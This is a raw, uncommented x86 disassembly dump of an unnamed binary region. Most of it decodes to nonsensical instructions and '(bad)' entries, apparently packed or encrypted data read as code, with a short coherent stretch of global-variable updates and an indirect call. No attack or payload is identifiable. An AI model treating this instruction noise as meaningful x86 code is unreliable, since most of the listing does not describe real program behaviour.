  41a943:	mov    ecx,0xc5177527
  41a948:	test   al,0xb3
  41a94a:	dec    esp
  41a94b:	xlat   BYTE PTR ds:[ebx]
  41a94c:	out    dx,eax
  41a94d:	or     BYTE PTR [ecx],ah
  41a94f:	(bad)  
  41a950:	into   
  41a951:	jbe    0x41a9af
  41a953:	jmp    0x83cf:0xdb89dd22
  41a95a:	sbb    edx,DWORD PTR ds:0x8e0719b2
  41a960:	fldcw  WORD PTR [edi+eax*8]
  41a963:	(bad)  ds:0xfed51b6d
  41a969:	add    DWORD PTR [esi-0x1a],edi
  41a96c:	inc    ebx
  41a96d:	mov    edx,0xe69e6afd
  41a972:	in     eax,0xae
  41a974:	push   es
  41a975:	pop    edx
  41a976:	or     cl,bh
  41a978:	dec    eax
  41a979:	mov    ah,0x5e
  41a97b:	lea    edi,[ecx+0x57883d4e]
  41a981:	sub    eax,0xa604a423
  41a986:	push   ecx
  41a987:	cmc    
  41a988:	idiv   BYTE PTR [edx-0x523d9b37]
  41a98e:	in     al,dx
  41a98f:	aaa    
  41a990:	mov    al,0xf2
  41a992:	add    eax,0x8604d2ba
  41a997:	lods   eax,DWORD PTR ds:[esi]
  41a998:	scas   al,BYTE PTR es:[edi]
  41a999:	inc    ecx
  41a99a:	call   0x197a:0x7dee6196
  41a9a1:	dec    esi
  41a9a2:	and    esi,DWORD PTR [edi+0x53bf44d8]
  41a9a8:	icebp  
  41a9a9:	ror    eax,1
  41a9ab:	sub    DWORD PTR [esi+0x29],esp
  41a9ae:	mov    bh,0xa
  41a9b0:	aas    
  41a9b1:	in     al,0x17
  41a9b3:	pop    esp
  41a9b4:	test   BYTE PTR [edi],cl
  41a9b6:	jg     0x41a958
  41a9b8:	mov    ds,WORD PTR [ebx+0x57]
  41a9bb:	push   edx
  41a9bc:	pop    ecx
  41a9bd:	cld    
  41a9be:	rol    DWORD PTR [ecx],1
  41a9c0:	sbb    eax,0x5a374ad
  41a9c5:	or     esi,DWORD PTR [edi]
  41a9c7:	xor    DWORD PTR [ebp-0x7410c4f2],eax
  41a9cd:	out    0x9,eax
  41a9cf:	sub    ebx,ebx
  41a9d1:	adc    al,0xf8
  41a9d3:	imul   ebx,DWORD PTR [edx],0x8fd8706
  41a9d9:	mov    bl,0xb8
  41a9db:	sets   BYTE PTR ds:0x4ae39142
  41a9e2:	jae    0x41aa22
  41a9e4:	adc    dh,0x57
  41a9e7:	cmp    ch,bl
  41a9e9:	and    eax,0x6f8df774
  41a9ee:	mov    ds:0x702f8580,al
  41a9f3:	mov    ebx,0x2cebd03
  41a9f8:	add    al,BYTE PTR [esi+edi*8-0x6a]
  41a9fc:	enter  0x62b7,0xc6
  41aa00:	inc    edx
  41aa01:	sub    ch,bh
  41aa03:	add    eax,0x994749cf
  41aa08:	pop    edi
  41aa09:	mov    dl,0x6b
  41aa0b:	inc    BYTE PTR [ebp-0x59a9a995]
  41aa11:	dec    ecx
  41aa12:	fisubr DWORD PTR [ebp-0x2e499676]
  41aa18:	rcl    DWORD PTR [esi+0x60cb6372],0x54
  41aa1f:	jbe    0x41aa07
  41aa21:	sti    
  41aa22:	je     0x41a9d9
  41aa24:	outs   dx,DWORD PTR ds:[esi]
  41aa25:	lods   eax,DWORD PTR ds:[esi]
  41aa26:	fcomp  DWORD PTR [esp+ecx*1+0x21]
  41aa2a:	push   edx
  41aa2b:	and    DWORD PTR [ecx],edi
  41aa2d:	(bad)
  41aa30:	in     al,dx
  41aa31:	adc    BYTE PTR [ebx+0x77],dl
  41aa34:	aad    0x5d
  41aa36:	int3   
  41aa37:	push   esi
  41aa38:	icebp  
  41aa39:	sub    DWORD PTR [esp+eax*8+0x18],eax
  41aa3d:	sub    eax,0x5adcdfb0
  41aa42:	sub    al,0x6a
  41aa44:	pop    ebx
  41aa45:	push   ss
  41aa46:	enter  0x1064,0xe0
  41aa4a:	push   ecx
  41aa4b:	jecxz  0x41aa26
  41aa4d:	lea    esi,[ecx-0x370e21b6]
  41aa53:	xor    BYTE PTR [ecx],ch
  41aa55:	inc    edi
  41aa56:	rep ds stos DWORD PTR es:[edi],eax
  41aa59:	rcr    BYTE PTR [esi-0x6b],0x74
  41aa5d:	inc    edi
  41aa5e:	sub    BYTE PTR [edx],al
  41aa60:	xor    eax,0x1faa1115
  41aa65:	jp     0x41aa55
  41aa67:	jns    0x41aa7f
  41aa69:	inc    esp
  41aa6a:	inc    esp
  41aa6b:	or     dl,BYTE PTR [esi-0x49]
  41aa6e:	sti    
  41aa6f:	outs   dx,DWORD PTR ds:[esi]
  41aa70:	mov    al,ds:0x64fcd0b7
  41aa75:	jo     0x41aace
  41aa77:	mov    edi,0x5cd64b9b
  41aa7c:	jne    0x41aa0c
  41aa7e:	outs   dx,DWORD PTR cs:[esi]
  41aa80:	jnp    0x41aa7b
  41aa82:	push   ebp
  41aa83:	aas    
  41aa84:	out    dx,eax
  41aa85:	adc    bl,al
  41aa87:	mov    eax,ds:0xb2790b53
  41aa8c:	xor    al,0xb8
  41aa8e:	fmul   DWORD PTR [ebx+0x3c974015]
  41aa94:	xchg   ecx,eax
  41aa95:	shl    ecx,0xe2
  41aa98:	movnti DWORD PTR [ebp+0x1c],ebp
  41aa9c:	popf   
  41aa9d:	nop
  41aa9e:	jmp    0x7d590789
  41aaa3:	rcl    DWORD PTR [ecx],1
  41aaa5:	cmp    BYTE PTR [edi+eax*4+0x45],cl
  41aaa9:	add    bl,BYTE PTR ds:0x4a13d545
  41aaaf:	sti    
  41aab0:	mov    eax,DWORD PTR [edx+edi*2-0x4a0f03e]
  41aab7:	clc    
  41aab8:	adc    ebp,DWORD PTR [ebp-0x28]
  41aabb:	jmpw   0x7fd0
  41aabf:	(bad)  
  41aac0:	sbb    eax,0xf0397ea4
  41aac5:	jns    0x41aa49
  41aac7:	mov    edx,0xd1d6783f
  41aacc:	fisttp WORD PTR [edx]
  41aace:	mov    ds:0xb75babcc,eax
  41aad3:	int3   
  41aad4:	(bad)  
  41aad5:	rol    BYTE PTR [ecx],cl
  41aad7:	ret    0x333d
  41aada:	aaa    
  41aadb:	push   ecx
  41aadc:	or     eax,0xe19d3036
  41aae1:	dec    ecx
  41aae2:	in     eax,0x44
  41aae4:	xchg   esi,eax
  41aae5:	jne    0x41aad2
  41aae7:	lea    eax,es:[ecx+0x126412c9]
  41aaee:	test   al,0x80
  41aaf0:	loopne 0x41aad0
  41aaf2:	xchg   ecx,eax
  41aaf3:	push   ebx
  41aaf4:	fst    QWORD PTR [eax]
  41aaf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aaf7:	js     0x41ab33
  41aaf9:	mov    eax,0xee2542e3
  41aafe:	dec    esp
  41aaff:	mov    edx,0x59d7dc6c
  41ab04:	mov    ebp,0xf1501614
  41ab09:	cmp    ah,bh
  41ab0b:	push   cs
  41ab0c:	push   es
  41ab0d:	daa    
  41ab0e:	retf   
  41ab0f:	jae    0x41ab84
  41ab11:	xor    esp,DWORD PTR [eax-0x60cc7975]
  41ab17:	mov    al,ds:0x66af4cc
  41ab1c:	or     ah,BYTE PTR [ebx-0x2a]
  41ab1f:	cdq    
  41ab20:	and    BYTE PTR [eax],ah
  41ab22:	imul   ecx,DWORD PTR [eax-0x38],0x87e4b06f
  41ab29:	mov    eax,edi
  41ab2b:	repz sub DWORD PTR [edx+0x2cde902b],ecx
  41ab32:	dec    ebx
  41ab33:	(bad)  
  41ab34:	icebp  
  41ab35:	stos   BYTE PTR es:[edi],al
  41ab36:	inc    eax
  41ab37:	push   0xb55c7f21
  41ab3c:	pop    edi
  41ab3d:	das    
  41ab3e:	retf   0x2c7f
  41ab41:	test   DWORD PTR [ecx],esi
  41ab43:	in     eax,0x54
  41ab45:	fimul  WORD PTR [edx+0x74]
  41ab48:	xor    BYTE PTR [edx-0x41c8653f],al
  41ab4e:	sbb    DWORD PTR [ebx],ebx
  41ab50:	retf   0x5a2b
  41ab53:	xor    al,0x2e
  41ab55:	or     esi,DWORD PTR ds:0x87c633b
  41ab5b:	ror    bl,1
  41ab5d:	mov    ah,BYTE PTR [esi+0x1e]
  41ab60:	mov    fs,WORD PTR [ebx-0x29]
  41ab63:	retf   
  41ab64:	sbb    al,0xcc
  41ab66:	mov    al,ds:0xd1c47095
  41ab6b:	pop    ecx
  41ab6c:	mov    ch,0x6
  41ab6e:	fdiv   st(1),st
  41ab70:	out    0x42,al
  41ab72:	cwde   
  41ab73:	imul   eax,DWORD PTR [ebp-0x39],0x98b7dd2a
  41ab7a:	dec    ebx
  41ab7b:	xchg   edx,eax
  41ab7c:	xchg   esi,eax
  41ab7d:	fnstsw WORD PTR [edx+0x2d]
  41ab80:	xor    esp,ecx
  41ab82:	mov    DWORD PTR [esi+0x2a597347],esi
  41ab88:	dec    edi
  41ab89:	adc    eax,0x76b5bd36
  41ab8e:	out    dx,eax
  41ab8f:	imul   esp,DWORD PTR [ebx+0x5ff578eb],0x84af328
  41ab99:	xor    BYTE PTR [ecx-0x41becc88],al
  41ab9f:	mov    bl,0x69
  41aba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aba2:	ins    BYTE PTR es:[edi],dx
  41aba3:	lods   eax,DWORD PTR ds:[esi]
  41aba4:	push   ds
  41aba5:	dec    eax
  41aba6:	adc    ah,ah
  41aba8:	xchg   DWORD PTR [ecx-0x279f2564],eax
  41abae:	pop    ebx
  41abaf:	push   esp
  41abb0:	fld    DWORD PTR [ecx-0x55]
  41abb3:	xor    cl,bl
  41abb5:	aas    
  41abb6:	js     0x41abee
  41abb8:	mov    ebx,0x5d43d55a
  41abbd:	aam    0xcf
  41abbf:	mov    esp,0xad0e0aaa
  41abc4:	xlat   BYTE PTR ds:[ebx]
  41abc5:	shr    BYTE PTR [ecx],0x1b
  41abc8:	enter  0x10b8,0x1b
  41abcc:	out    dx,al
  41abcd:	sbb    BYTE PTR [esi],ch
  41abcf:	pop    esi
  41abd0:	int3   
  41abd1:	aaa    
  41abd2:	imul   ebx,DWORD PTR ds:0x61355f85,0xffffff9b
  41abd9:	inc    DWORD PTR [ebx+0x7d]
  41abdc:	aad    0xa
  41abde:	add    al,0x39
  41abe0:	pop    esp
  41abe1:	jmp    0x41abe8
  41abe3:	call   0xfba282c2
  41abe8:	imul   esp,eax,0x1731794d
  41abee:	mov    bh,0xbc
  41abf0:	or     BYTE PTR ds:0x8f23f6ad,bl
  41abf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abf7:	not    DWORD PTR [edx-0x10]
  41abfa:	jbe    0x41abce
  41abfc:	inc    esp
  41abfd:	cwde   
  41abfe:	cmp    BYTE PTR [ebx+0x5f002c05],al
  41ac04:	mov    BYTE PTR [esi+esi*8],cl
  41ac07:	sub    edi,DWORD PTR [ebp+0x3d]
  41ac0a:	inc    edi
  41ac0b:	add    eax,0x58714006
  41ac10:	das    
  41ac11:	xchg   edi,eax
  41ac12:	bnd jmp 0xdfcb4d0c
  41ac18:	sbb    al,BYTE PTR [ebx]
  41ac1a:	push   0x4ca81797
  41ac1f:	fs sar ch,1
  41ac22:	mov    dh,0x54
  41ac24:	clc    
  41ac25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac26:	sbb    al,0xd7
  41ac28:	ds dec esi
  41ac2a:	xor    ecx,0x71
  41ac2d:	adc    al,0x5f
  41ac2f:	inc    ebx
  41ac30:	jb     0x41ac62
  41ac32:	retf   0x6798
  41ac35:	outs   dx,DWORD PTR ds:[esi]
  41ac36:	xchg   BYTE PTR [ebx],bl
  41ac38:	sbb    DWORD PTR [edi+0x42],esp
  41ac3b:	add    BYTE PTR [esi+0xb345587],bh
  41ac41:	or     ebp,ebp
  41ac43:	dec    ebp
  41ac44:	(bad)  
  41ac46:	mov    bl,0x38
  41ac48:	cmp    al,0x51
  41ac4a:	push   ss
  41ac4b:	dec    ebx
  41ac4c:	push   eax
  41ac4d:	jecxz  0x41abed
  41ac4f:	or     BYTE PTR fs:[ecx-0x2a],0x7c
  41ac54:	cmp    DWORD PTR [eax+0x7b8003bb],edx
  41ac5a:	std    
  41ac5b:	outs   dx,BYTE PTR ds:[esi]
  41ac5c:	push   0xc5992bf6
  41ac61:	or     BYTE PTR [esp+esi*1-0x11f9d345],0xea
  41ac69:	pusha  
  41ac6a:	rcl    ah,1
  41ac6c:	pop    eax
  41ac6d:	jle    0x41ac43
  41ac6f:	push   ecx
  41ac70:	and    DWORD PTR [ebp+0x3c],edi
  41ac73:	or     BYTE PTR [edi-0x5d],bl
  41ac76:	stc    
  41ac77:	int    0x6c
  41ac79:	(bad)  
  41ac7b:	mov    bh,0x60
  41ac7d:	cld    
  41ac7e:	mov    ds:0xbfcd9007,eax
  41ac83:	fsub   QWORD PTR [eax+ebp*8]
  41ac86:	cmp    DWORD PTR [eax-0x710d99a5],ebp
  41ac8c:	test   BYTE PTR [ebp+edi*8-0x13],dl
  41ac90:	ds mov edx,0x21ff
  41ac96:	add    DWORD PTR ds:0x422942,0x42b3
  41aca0:	sub    edx,eax
  41aca2:	mov    eax,ds:0x4228ea
  41aca7:	push   esi
  41aca8:	mov    eax,0xb49
  41acad:	sbb    eax,ecx
  41acaf:	cmp    DWORD PTR ds:0x422916,0x0
  41acb6:	mov    DWORD PTR ds:0x4229d2,ebx
  41acbc:	mov    DWORD PTR ds:0x42293a,ecx
  41acc2:	mov    DWORD PTR ds:0x422942,ecx
  41acc8:	jmp    0x41ad23
  41accd:	not    DWORD PTR ds:0x4228ce
  41acd3:	jge    0x41acf8
  41acd9:	push   0x7637
  41acde:	call   DWORD PTR ds:0x42a02c
  41ace4:	adc    ecx,DWORD PTR ds:0x42295a
  41acea:	xor    esi,esi
  41acec:	xor    esi,DWORD PTR ds:0x4228ea
  41acf2:	and    DWORD PTR ds:0x422952,esi
  41acf8:	sbb    DWORD PTR ds:0x422986,ebx
  41acfe:	mov    esi,DWORD PTR ds:0x422a9a
  41ad04:	mov    ecx,DWORD PTR ds:0x422afa
  41ad0a:	sub    ecx,esi
  41ad0c:	add    esi,DWORD PTR [esi+ecx*1]
  41ad0f:	xor    ecx,ecx
  41ad11:	xor    ecx,DWORD PTR ds:0x4228ae
  41ad17:	or     DWORD PTR ds:0x422896,ecx
  41ad1d:	sbb    ecx,DWORD PTR ds:0x422976
  41ad23:	mov    ecx,DWORD PTR [ebp-0x20]
  41ad26:	mov    esi,DWORD PTR [ebp-0x1c]
  41ad29:	jmp    0x41b172
  41ad2e:	test   BYTE PTR [eax+ecx*2+0x7c],ah
  41ad32:	sub    BYTE PTR [eax],ah
  41ad34:	cmp    BYTE PTR [ebp+eax*1-0x4e],dl
  41ad38:	cmc    
  41ad39:	push   0xaec06458
  41ad3e:	int    0x1d
  41ad40:	or     al,0x16
  41ad42:	(bad)  
  41ad43:	push   cs
  41ad44:	push   ss
  41ad45:	push   ss
  41ad46:	push   eax
  41ad47:	jl     0x41adc6
  41ad49:	sub    eax,0x9eda7f6
  41ad4e:	jo     0x41acdc
  41ad50:	dec    esi
  41ad51:	inc    ebx
  41ad52:	mov    ch,0x6c
  41ad54:	mov    ds:0x2c4b7e41,al
  41ad59:	fldcw  WORD PTR [edi+edx*2-0x5194a3c6]
  41ad60:	cmp    ebp,DWORD PTR [ebx]
  41ad62:	cmp    ecx,DWORD PTR [edi]
  41ad64:	daa    
  41ad65:	js     0x41adbe
  41ad67:	idiv   BYTE PTR [eax]
  41ad69:	and    dh,BYTE PTR [esi+0x4e1a806b]
  41ad6f:	jp     0x41ad48
  41ad71:	dec    DWORD PTR [edi]
  41ad73:	ins    DWORD PTR es:[edi],dx
  41ad74:	add    bh,bl
  41ad76:	hlt    
  41ad77:	stc    
  41ad78:	ins    DWORD PTR es:[edi],dx
  41ad79:	adc    DWORD PTR [ecx+edi*1+0x4d],esp
  41ad7d:	out    dx,al
  41ad7e:	in     al,dx
  41ad7f:	shl    BYTE PTR [edi],cl
  41ad81:	rsm    
  41ad83:	xlat   BYTE PTR ds:[ebx]
  41ad84:	or     ebx,edx
  41ad86:	and    cl,dh
  41ad88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad89:	sar    ebx,0xc1
  41ad8c:	icebp  
  41ad8d:	pop    es
  41ad8e:	inc    edx
  41ad8f:	(bad)  
  41ad90:	jb     0x41ad97
  41ad92:	jnp    0x41ad47
  41ad94:	rcr    BYTE PTR [ebx],1
  41ad96:	mov    al,ds:0x748a8fc1
  41ad9b:	sub    eax,0xa725855a
  41ada0:	mov    esi,0x3f6da68c
  41ada5:	nop
  41ada6:	lahf   
  41ada7:	test   al,0x15
  41ada9:	das    
  41adaa:	push   es
  41adab:	push   ds
  41adac:	inc    edi
  41adad:	xchg   esi,eax
  41adae:	dec    ebx
  41adaf:	nop
  41adb0:	xor    ah,dl
  41adb2:	inc    ecx
  41adb3:	jno    0x41adfa
  41adb5:	mov    dl,0xb3
  41adb7:	inc    edx
  41adb8:	cmp    ch,BYTE PTR [edx]
  41adba:	push   ecx
  41adbb:	mov    edx,0x60ba806d
  41adc0:	call   0x276cb592
  41adc5:	inc    ebp
  41adc6:	test   al,0x58
  41adc8:	jbe    0x41ada4
  41adca:	repz xor eax,DWORD PTR [edx-0x74bd79b2]
  41add1:	push   esi
  41add2:	gs sbb eax,ebp
  41add5:	rol    BYTE PTR [ebp+0xd],1
  41add8:	xor    BYTE PTR [ecx],bl
  41adda:	pop    ss
  41addb:	ins    BYTE PTR es:[edi],dx
  41addc:	call   0x2e7e:0x158ccee7
  41ade3:	xor    al,0xfc
  41ade5:	lea    edi,[edi+0xb]
  41ade8:	and    DWORD PTR [ebx-0xbc54863],edx
  41adee:	sar    BYTE PTR [edx],1
  41adf0:	add    al,0x98
  41adf2:	and    eax,0xf395440b
  41adf7:	jmp    0xb5f39679
  41adfc:	dec    ecx
  41adfd:	retf   
  41adfe:	or     ebp,DWORD PTR [edx-0x77bd5118]
  41ae04:	mov    bl,0x19
  41ae06:	jp     0x41adfb
  41ae08:	ins    DWORD PTR es:[edi],dx
  41ae09:	pusha  
  41ae0a:	mov    al,0xfb
  41ae0c:	and    al,0x78
  41ae0e:	fwait
  41ae0f:	inc    eax
  41ae10:	xor    ebp,DWORD PTR ds:0x215fb577
  41ae16:	fist   WORD PTR [esi-0x18642b78]
  41ae1c:	outs   dx,BYTE PTR ds:[esi]
  41ae1d:	ins    BYTE PTR es:[edi],dx
  41ae1e:	lods   al,BYTE PTR ds:[esi]
  41ae1f:	mov    ecx,DWORD PTR [eax-0x18]
  41ae22:	mov    ecx,0x6379f3c7
  41ae27:	(bad)  
  41ae28:	mov    edi,0x709240d8
  41ae2d:	fcom   DWORD PTR [ecx+0x22]
  41ae30:	sub    eax,0xc3eaba2b
  41ae35:	hlt    
  41ae36:	dec    esi
  41ae37:	fcmovbe st,st(7)
  41ae39:	add    dl,BYTE PTR [esi-0x7f04ab93]
  41ae3f:	sbb    BYTE PTR [ebp+0x7b],al
  41ae42:	mov    bh,0x42
  41ae44:	xchg   BYTE PTR [ebx-0x65],ch
  41ae47:	retf   
  41ae48:	enter  0x4b07,0xdf
  41ae4c:	inc    edi
  41ae4d:	scas   al,BYTE PTR es:[edi]
  41ae4e:	lods   al,BYTE PTR ds:[esi]
  41ae4f:	inc    esi
  41ae50:	mov    al,BYTE PTR [ecx-0x7654aba3]
  41ae56:	leave  
  41ae57:	pop    edx
  41ae58:	mov    ds:0x9b8fbae1,al
  41ae5d:	push   0xefa599f0
  41ae62:	jnp    0x41aeb8
  41ae64:	sbb    dh,BYTE PTR [esi-0x7a]
  41ae67:	mov    eax,edi
  41ae69:	cmp    DWORD PTR [ebp-0x5d],esp
  41ae6c:	icebp  
  41ae6d:	imul   esi,DWORD PTR [eax+0x2c04e1e0],0xf7d15429
  41ae77:	jge    0x41ae5b
  41ae79:	xor    al,0x5f
  41ae7b:	adc    eax,0x3daf6663
  41ae80:	xchg   ecx,eax
  41ae81:	jae    0x41ae7b
  41ae83:	in     al,dx
  41ae84:	adc    DWORD PTR [edx],eax
  41ae86:	stc    
  41ae87:	sub    eax,DWORD PTR [ecx-0x74547e3a]
  41ae8d:	fidivr WORD PTR [edx]
  41ae8f:	mov    ebx,0x274d62ab
  41ae94:	out    dx,eax
  41ae95:	int3   
  41ae96:	mov    eax,ds:0x52ae64cd
  41ae9b:	mov    ebp,0x4a07ef87
  41aea0:	jb     0x41ae25
  41aea2:	cmp    BYTE PTR [eax+0x3ab77f95],bh
  41aea8:	test   al,0xf
  41aeaa:	(bad)  [eax-0x351d4738]
  41aeb0:	in     eax,0x72
  41aeb2:	fsubr  DWORD PTR [edi-0x2c]
  41aeb5:	and    esi,DWORD PTR [eax-0x28]
  41aeb8:	xor    ebx,DWORD PTR ds:0xa151bc1a
  41aebe:	xchg   esi,eax
  41aebf:	dec    edx
  41aec0:	fisub  WORD PTR [eax+0x2cd20aa7]
  41aec6:	adc    eax,0xe0e7825d
  41aecb:	or     DWORD PTR [esi],edx
  41aecd:	sub    edx,esi
  41aecf:	std    
  41aed0:	cmp    al,0xf8
  41aed2:	sub    eax,0xc8f2de7
  41aed7:	jmp    0x41aef7
  41aed9:	push   edi
  41aeda:	add    DWORD PTR [edx],edi
  41aedc:	fldenv ds:0xfa0877e
  41aee2:	dec    edi
  41aee3:	jge    0x41af5f
  41aee5:	scas   al,BYTE PTR es:[edi]
  41aee6:	popa   
  41aee7:	and    bh,dh
  41aee9:	add    DWORD PTR [eax-0x27],esi
  41aeec:	add    eax,0x3b7c43cf
  41aef1:	sub    DWORD PTR [ebx-0x10],eax
  41aef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aef5:	or     BYTE PTR [eax],al
  41aef7:	xchg   esi,eax
  41aef8:	rcl    BYTE PTR [ebp-0x602bf097],0xf
  41aeff:	ds inc edi
  41af01:	mov    BYTE PTR [eax-0x14],bh
  41af04:	xor    BYTE PTR [ecx+0xfd71032],ah
  41af0a:	xor    al,dh
  41af0c:	das    
  41af0d:	jge    0x41af3f
  41af0f:	xchg   DWORD PTR [esp+ebp*4],eax
  41af12:	mov    WORD PTR [edx],?
  41af14:	pmaxsw mm0,QWORD PTR [ebp-0x4d]
  41af18:	leave  
  41af19:	pop    ds
  41af1a:	icebp  
  41af1b:	and    al,0x71
  41af1d:	jecxz  0x41af77
  41af1f:	mov    eax,ds:0xdb518922
  41af24:	jnp    0x41af74
  41af26:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41af28:	addr16 xor edx,edx
  41af2b:	mov    ch,0x4b
  41af2d:	(bad)  
  41af2e:	sub    dh,dh
  41af30:	aas    
  41af31:	(bad)  
  41af33:	jp     0x41af87
  41af35:	dec    esi
  41af36:	outs   dx,BYTE PTR ds:[esi]
  41af37:	out    0x62,eax
  41af39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af3a:	daa    
  41af3b:	pop    esi
  41af3c:	dec    edx
  41af3d:	and    eax,0xe3425b68
  41af42:	sub    edi,ebx
  41af44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af45:	clc    
  41af46:	cmp    DWORD PTR [edi+0x29c744d2],edx
  41af4c:	inc    ebp
  41af4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af4e:	sbb    dh,BYTE PTR [edi+0x72]
  41af51:	pop    ds
  41af52:	in     al,dx
  41af53:	jmp    0x6295:0xbaba5bde
  41af5a:	dec    esp
  41af5b:	mov    cl,0x92
  41af5d:	daa    
  41af5e:	dec    ebp
  41af5f:	xor    al,0x9f
  41af61:	clc    
  41af62:	xor    dh,BYTE PTR [edx-0x12]
  41af65:	das    
  41af66:	out    0x38,eax
  41af68:	int3   
  41af69:	jp     0x41af20
  41af6b:	lahf   
  41af6c:	lods   al,BYTE PTR ds:[esi]
  41af6d:	pop    ds
  41af6e:	add    DWORD PTR [edi+0x2b],ecx
  41af71:	sub    al,0x87
  41af73:	aas    
  41af74:	dec    ebp
  41af75:	push   esp
  41af76:	pop    ds
  41af77:	sub    DWORD PTR [ebx],edi
  41af79:	push   esp
  41af7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af7b:	xchg   ebx,eax
  41af7c:	mov    al,0x32
  41af7e:	push   es
  41af7f:	out    dx,eax
  41af80:	mov    ebx,0xfacb6d13
  41af85:	loop   0x41af0c
  41af87:	gs mov dl,0x7f
  41af8a:	push   esi
  41af8b:	mov    WORD PTR [ebp+0x29],ds
  41af8e:	sbb    DWORD PTR [esp+ecx*1-0xf0999c],edx
  41af95:	les    esp,FWORD PTR [ecx+0x666134ad]
  41af9b:	aam    0xf3
  41af9d:	hlt    
  41af9e:	mov    ah,BYTE PTR [esi]
  41afa0:	fisttp DWORD PTR [ecx+0x70cecf1f]
  41afa6:	jnp    0x41af4a
  41afa8:	adc    al,0x19
  41afaa:	mov    ch,0x5d
  41afac:	mov    dh,BYTE PTR [esi+0x72]
  41afaf:	jmp    0xba4:0x8d59d681
  41afb6:	lods   al,BYTE PTR ds:[esi]
  41afb7:	mov    cl,BYTE PTR [ebx+0x3b7e771d]
  41afbd:	inc    ecx
  41afbe:	push   ebp
  41afbf:	add    dh,BYTE PTR [ecx+eax*8]
  41afc2:	push   ss
  41afc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afc4:	mov    esi,0x13112fe6
  41afc9:	mov    al,0xd8
  41afcb:	and    cl,BYTE PTR [ebx+0x68]
  41afce:	outs   dx,DWORD PTR ds:[esi]
  41afcf:	xchg   edi,eax
  41afd0:	or     ah,BYTE PTR [ebx+0x4003d446]
  41afd6:	push   eax
  41afd7:	iret   
  41afd8:	adc    al,0x5e
  41afda:	xchg   edx,eax
  41afdb:	push   esi
  41afdc:	das    
  41afdd:	sub    DWORD PTR [esi-0xfedbbe8],eax
  41afe3:	jo     0x41afab
  41afe5:	mov    esp,0xb2c73c39
  41afea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afeb:	arpl   WORD PTR ds:0xf6ce12f6,sp
  41aff1:	push   0x940810b2
  41aff6:	mov    ah,0xd6
  41aff8:	loop   0x41afce
  41affa:	push   cs
  41affb:	jns    0x41b04d
  41affd:	scas   eax,DWORD PTR es:[edi]
  41affe:	push   esp
  41afff:	inc    esi
  41b000:	pop    es
  41b001:	fimul  DWORD PTR [ebx+0x400f361b]
  41b007:	jge    0x41affa
  41b009:	mov    ecx,DWORD PTR [ebp+0x23]
  41b00c:	ret    
  41b00d:	leave  
  41b00e:	jae    0x41b031
  41b010:	mov    bh,0x1e
  41b012:	ins    DWORD PTR es:[edi],dx
  41b013:	jae    0x41affb
  41b015:	retf   
  41b016:	daa    
  41b017:	fistp  QWORD PTR [eax]
  41b019:	or     al,0x42
  41b01b:	sbb    edx,DWORD PTR [edx+0x50]
  41b01e:	mov    eax,ds:0x5752048d
  41b023:	sub    al,0xb
  41b025:	add    eax,0xa55daea
  41b02a:	inc    edx
  41b02b:	xor    BYTE PTR [edx],0xf2
  41b02e:	cli    
  41b02f:	sub    ch,dh
  41b031:	out    dx,al
  41b032:	lahf   
  41b033:	test   BYTE PTR [esi+eax*8+0x2a],bl
  41b037:	xor    al,0x16
  41b039:	dec    esi
  41b03a:	shr    BYTE PTR [esp+esi*4+0x5cb5dfeb],0xb8
  41b042:	push   eax
  41b043:	xchg   edi,eax
  41b044:	push   ebx
  41b045:	pop    esp
  41b046:	and    eax,0x4cb694a0
  41b04b:	call   0x9727:0x3b4d8448
  41b052:	inc    ecx
  41b053:	stc    
  41b054:	xchg   edi,eax
  41b055:	pop    ebp
  41b056:	mov    gs,edx
  41b058:	ins    BYTE PTR es:[edi],dx
  41b059:	and    ebx,DWORD PTR [edx-0x78]
  41b05c:	cli    
  41b05d:	sahf   
  41b05e:	push   es
  41b05f:	mov    ah,0xaf
  41b061:	clc    
  41b062:	aas    
  41b063:	mov    dl,0x81
  41b065:	push   0x36a1e6e3
  41b06a:	scas   eax,DWORD PTR es:[edi]
  41b06b:	arpl   WORD PTR [edx],bp
  41b06d:	scas   al,BYTE PTR es:[edi]
  41b06e:	cmc    
  41b06f:	aaa    
  41b070:	lea    ebp,[edi]
  41b072:	mov    bh,0xfa
  41b074:	nop
  41b075:	or     eax,0x29ea664f
  41b07a:	or     esp,DWORD PTR [ecx]
  41b07c:	ds sbb al,0x6
  41b07f:	jecxz  0x41b0b3
  41b081:	jmp    0x2ae6:0xc2ed1934
  41b088:	mov    eax,fs:0x3659ce74
  41b08e:	rcr    BYTE PTR [ecx],1
  41b090:	pop    es
  41b091:	pop    ebx
  41b092:	inc    eax
  41b093:	mov    gs,ebx
  41b095:	ins    DWORD PTR es:[edi],dx
  41b096:	jno    0x41b0a1
  41b098:	mov    edx,0x96ca6468
  41b09d:	sbb    BYTE PTR [esi+0x9],0xf3
  41b0a1:	test   al,0xc0
  41b0a3:	push   ebp
  41b0a4:	cmp    eax,ecx
  41b0a6:	sbb    ebp,0x1358834f
  41b0ac:	loope  0x41b0dc
  41b0ae:	adc    al,0x4b
  41b0b0:	pop    ss
  41b0b1:	cmp    cl,0xb
  41b0b4:	arpl   bx,bp
  41b0b6:	(bad)  
  41b0b7:	iret   
  41b0b8:	stos   BYTE PTR es:[edi],al
  41b0b9:	jnp    0x41b0c4
  41b0bb:	fld    TBYTE PTR [ebx+0x33]
  41b0be:	sbb    al,0x4b
  41b0c0:	ja     0x41b090
  41b0c2:	or     esi,DWORD PTR [edi-0x2e]
  41b0c5:	push   ds
  41b0c6:	jnp    0x41b103
  41b0c8:	add    BYTE PTR [esi],ah
  41b0ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0cb:	add    dl,ah
  41b0cd:	mov    eax,0xcd717edd
  41b0d2:	add    al,0xd8
